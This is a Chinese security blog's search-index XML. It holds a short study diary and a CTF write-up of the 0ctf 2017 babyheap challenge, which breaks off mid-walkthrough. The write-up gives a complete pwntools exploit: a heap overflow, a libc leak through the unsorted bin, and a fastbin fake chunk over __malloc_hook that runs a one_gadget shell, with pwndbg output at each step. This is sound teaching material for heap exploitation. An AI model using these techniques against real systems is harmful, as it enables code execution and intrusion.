<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Thunder_Jのdiary</title>
    <url>/2099/12/02/Thunder-J%E3%81%AEdiary/</url>
    <content><![CDATA[<h2 id="2020-1-8"><a href="#2020-1-8" class="headerlink" title="2020-1-8"></a>2020-1-8</h2><p>马上就去科恩实习了，希望自己能够学到一些真正前沿的东西，目标还有太多太多了，在去年听到Sakura学长一年进玄武的消息，总觉得离自己很远，现在自己虽然没有进玄武，科恩也是能够让我升华很多的地方。希望自己能够学到更多的东西，2020年拥有一个属于自己的一个CVE编号，博客已经成功迁移到我的新电脑，我会更新一些我认为比较好的文章，提升博客的质量 :)</p>
<h2 id="2019-11-18"><a href="#2019-11-18" class="headerlink" title="2019-11-18"></a>2019-11-18</h2><p>因为换了电脑，博客可能不好迁移，可能更多在其他安全社区发布一些文章，在我的介绍之中可以找到我的一些信息</p>
<h2 id="2019-9-10"><a href="#2019-9-10" class="headerlink" title="2019-9-10"></a>2019-9-10</h2><p>两个多月的实习期即将结束，在奇安信学到了很多，回学校准备研究一段时间的Linux pwn，外加一些基础的复习，Windows内核也会逐步推进，写的一些零碎的文章我会选择性的发表在我的博客</p>
<h2 id="2019-8-18"><a href="#2019-8-18" class="headerlink" title="2019-8-18"></a>2019-8-18</h2><p>这两天CVE-2015-0057调的我心态比较炸，堆的东西果然比较麻烦 :( ，持续更新最近写的几篇文章</p>
<p>[+] WWW 漏洞利用从 win7 到 win10(利用代码已经更新在GitHub)</p>
<p>[+] CVE-2018-8120 分析文章首发于先知社区 Poc 以及 Exp 已经更新在 GitHub(win 7 x64,win 7 x86)</p>
<p>[+] CVE-2017-1768 Poc 以及 Exp 已经更新在 GitHub(win 7 x86)</p>
<p>[+] CVE-2016-0095 Poc 以及 Exp 已经更新在 GitHub(win 7 x86)</p>
<h2 id="2019-7-28"><a href="#2019-7-28" class="headerlink" title="2019-7-28"></a>2019-7-28</h2><p>整合一下最近读过的pdf</p>
<p>1.win7内核池</p>
<p><a href="https://github.com/ThunderJie/Study_pdf/blob/master/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf" target="_blank" rel="noopener">https://github.com/ThunderJie/Study_pdf/blob/master/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf</a></p>
<p>2.win8绕过SMEP机制</p>
<p><a href="https://github.com/ThunderJie/Study_pdf/blob/master/Windows%20SMEP%20bypass%20U%3DS.pptx" target="_blank" rel="noopener">https://github.com/ThunderJie/Study_pdf/blob/master/Windows%20SMEP%20bypass%20U%3DS.pptx</a></p>
<p>3.win10下WWW利用的一些新奇思路</p>
<p><a href="https://github.com/ThunderJie/Study_pdf/blob/master/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf" target="_blank" rel="noopener">https://github.com/ThunderJie/Study_pdf/blob/master/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf</a></p>
]]></content>
      <tags>
        <tag>学习日记</tag>
      </tags>
  </entry>
  <entry>
    <title>0ctf-babyheap</title>
    <url>/2019/09/10/0ctf-babyheap/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本片文章从0ctf2017-babyheap这一道pwn题目入手，讲解pwn堆中的一些利用手法</p>
<p><a href="https://uaf.io/assets/0ctfbabyheap" target="_blank" rel="noopener">题目链接</a></p>
<h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>首先检查程序保护，所有的保护措施都是开启的，这意味着我们想要改写程序流程考虑从<code>malloc_hook</code>和<code>free_hook</code>入手</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/thunder/Desktop/codes/ctf/pwn/heap/0ctf_babyheap/0ctfbabyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p><code>sed -i s/alarm/isnan/g ./0ctfbabyheap</code>命令除去alarm函数，初步运行程序，有以下几个功能：</p>
<ol>
<li>申请chunk</li>
<li>填充chunk</li>
<li>销毁chunk</li>
<li>输出chunk</li>
<li>退出程序</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure>
<p>漏洞点存在于申请chunk和填充chunk部分，我们着重对这两个地方进行分析</p>
<h3 id="申请chunk"><a href="#申请chunk" class="headerlink" title="申请chunk"></a>申请chunk</h3><p>IDA中反汇编如下，这里使用了<code>calloc</code>函数，相当于<code>malloc + memset</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">alloc</span><span class="params">(__int64 heap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">15</span>; ++index )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24L</span>L * index + heap) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      v2 = input_();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1u</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24L</span>L * index + heap) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(heap + <span class="number">24L</span>L * index + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(heap + <span class="number">24L</span>L * index + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Allocate Index %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)index);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反汇编中我们可以分析heap结构体大致如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> flag;　　　　<span class="comment">//标记是否被分配</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> size;　　　　<span class="comment">//请求申请的大小</span></span><br><span class="line">    <span class="keyword">void</span>* chunk_m;　　　　  <span class="comment">//chunk的mem值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="填充chunk"><a href="#填充chunk" class="headerlink" title="填充chunk"></a>填充chunk</h3><p>IDA反汇编如下，需要注意的是，这里并没有对填充的大小进行限制，也就意味着我们可以堆溢出控制下面的chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">fill</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = input_();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24L</span>L * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = input_();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = sub_11B2(*(_QWORD *)(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>这里先放exp，然后逐步进行调试讲解，我们的利用可以分为两步，第一步是泄露libc基地址，第二步是getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./0ctfbabyheap'</span>)</span><br><span class="line">elf =ELF(<span class="string">'./0ctfbabyheap'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    r.sendline(str(len(content)))</span><br><span class="line">    r.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> r.recvline()</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 0</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 1</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 2</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># fast chunk 3</span></span><br><span class="line">malloc(<span class="number">0x80</span>) <span class="comment"># small chunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># fastbin &lt;- chunk1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># fastbin &lt;- chunk2 &lt;- chunk1</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x58</span><span class="number">-0x399b00</span></span><br><span class="line">success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">fake_chunk = libc_base + <span class="number">0x399acd</span></span><br><span class="line">success(<span class="string">"fake chunk:"</span>+hex(fake_chunk))</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,p64(fake_chunk)) <span class="comment"># chunk[2]-&gt;fd = fake chunk</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>) <span class="comment"># malloc fake chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake chunk</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x3f35a</span>) <span class="comment"># one_gadgets</span></span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">malloc(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>这里我们是通过small chunk的机制泄露libc地址，当small chunk被释放之后，会进入unsorted bin中，它的fd和bk指针会指向同一个地址(unsorted bin链表的头部)，通过这个地址可以获得main_arena的地址，然后计算libc基地址，首先我们创建如下几个chunk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x10) # fast chunk 0</span><br><span class="line">malloc(0x10) # fast chunk 1</span><br><span class="line">malloc(0x10) # fast chunk 2</span><br><span class="line">malloc(0x10) # fast chunk 3</span><br><span class="line">malloc(0x80) # small chunk</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/20gx 0x361e77c925a0 =&gt; heap struct</span><br><span class="line">0x361e77c925a0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925b0:	0x000055c448092010	0x0000000000000001</span><br><span class="line">0x361e77c925c0:	0x0000000000000010	0x000055c448092030</span><br><span class="line">0x361e77c925d0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925e0:	0x000055c448092050	0x0000000000000001</span><br><span class="line">0x361e77c925f0:	0x0000000000000010	0x000055c448092070</span><br><span class="line">0x361e77c92600:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x361e77c92610:	0x000055c448092090	0x0000000000000000</span><br><span class="line">0x361e77c92620:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c92630:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>释放两个fast chunk，将第二个指向第一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021 =&gt; 0</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021 =&gt; 1 free</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021 =&gt; 2 free</span><br><span class="line">0x55c448092050:	0x000055c448092020	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021 =&gt; 3</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091 =&gt; 4</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x55c448092040 —▸ 0x55c448092020 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/20gx 0x361e77c925a0</span><br><span class="line">0x361e77c925a0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925b0:	0x000055c448092010	0x0000000000000000</span><br><span class="line">0x361e77c925c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c925d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c925e0:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x361e77c925f0:	0x0000000000000010	0x000055c448092070</span><br><span class="line">0x361e77c92600:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x361e77c92610:	0x000055c448092090	0x0000000000000000</span><br><span class="line">0x361e77c92620:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c92630:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这里我们通过 fill 函数修改第0个chunk之后的内容，因为没有限制，所以我们可以修改到2处的指针，让其指向chunk4，因为chunk4是small bin，被链入到了fast bin中会有size的检查，所以我们这里需要将chunk4处的size改为0x20过size的检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">fill(0,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80))</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021 free</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021 free</span><br><span class="line">0x55c448092050:	0x000055c448092080	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">code:</span><br><span class="line">fill(3,p64(0)*3+p64(0x21))</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092050:	0x000055c448092080	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x55c448092040 —▸ 0x55c448092080 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>然后我们申请这两个地方的fastbin就可以让index 2的堆块的地址和index 4堆块的地址一样，等index 4被free后，这里就是fd 字段，之后便能通过dump index 2来泄漏index 4的fd内容，括号中括起来的即是heap结构体中指向的同一地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x10)</span><br><span class="line">malloc(0x10)</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x361e77c925a0</span><br><span class="line">0x361e77c925a0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925b0:	0x000055c448092010	0x0000000000000001</span><br><span class="line">0x361e77c925c0:	0x0000000000000010	0x000055c448092050</span><br><span class="line">0x361e77c925d0:	0x0000000000000001	0x0000000000000010</span><br><span class="line">0x361e77c925e0:	(0x000055c448092090)	0x0000000000000001</span><br><span class="line">0x361e77c925f0:	0x0000000000000010	0x000055c448092070</span><br><span class="line">0x361e77c92600:	0x0000000000000001	0x0000000000000080</span><br><span class="line">0x361e77c92610:	(0x000055c448092090)	0x0000000000000000</span><br><span class="line">0x361e77c92620:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x361e77c92630:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们再将其改为原来的大小，申请释放即可泄露出fd指向的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">fill(3,p64(0)*3+p64(0x91))</span><br><span class="line">malloc(0x80)</span><br><span class="line">free(4)</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; x/20gx 0x55c448092000</span><br><span class="line">0x55c448092000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55c448092070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55c448092080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55c448092090:	0x00007f9c3ed6db58	0x00007f9c3ed6db58</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55c448092080 —▸ 0x7f9c3ed6db58 (main_arena+88) ◂— 0x55c448092080</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>这个地址是<code>main_arena+88</code>，我们将其减去0x58得到main_arena的地址，然后根据自己系统libc版本减去相应的偏移获得libc的基地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x58-0x399b00</span><br><span class="line">success(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">[...]</span><br><span class="line">    0x7f9c3e9d4000     0x7f9c3eb69000 r-xp   195000 0      /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; p/x 0x7f9c3ed6db00-0x7f9c3e9d4000</span><br><span class="line">$2 = 0x399b00</span><br></pre></td></tr></table></figure>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>我们这里考虑的是使用malloc_hook函数来getshell，当调用 malloc 时，如果 malloc_hook 不为空则调用指向的这个函数，所以这里我们传入一个 one-gadget 即可，首先我们需要找到一个fake chunk，我们将其申请到然后将 one-gadget 写入，它的size选择在0x10~0x80之间即可，这里选择的是mallc_hook上面一排的地方，为了使我们的user data刚好能够写到malloc_hook的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x7f9c3e9d4000+0x399acd</span><br><span class="line">0x7f9c3ed6dacd &lt;_IO_wide_data_0+301&gt;:	0x9c3ed69f00000000	0x000000000000007f</span><br><span class="line">0x7f9c3ed6dadd:	0x9c3ea50420000000	0x9c3ea503c000007f</span><br><span class="line">0x7f9c3ed6daed &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f9c3ed6dafd:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db0d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db1d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db2d &lt;main_arena+45&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db3d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f9c3ed6db4d &lt;main_arena+77&gt;:	0x0000000000000000	0xc4480921a0000000</span><br><span class="line">0x7f9c3ed6db5d &lt;main_arena+93&gt;:	0x0000000000000055	0xc448092080000000</span><br></pre></td></tr></table></figure>
<p>利用fast bin机制进行如下构造，我们需要申请到fake_chunk的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">fill(2,p64(fake_chunk)) # chunk[2]-&gt;fd = fake chunk</span><br><span class="line">debugger:</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x55c448092080 —▸ 0x7f9c3ed6dacd (_IO_wide_data_0+301) ◂— 0x9c3ea50420000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55c4480920f0 —▸ 0x7f9c3ed6db58 (main_arena+88) ◂— 0x55c4480920f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>继续malloc两次即可申请到fake chunk的地方，就可以对malloc_hook进行写入</p>
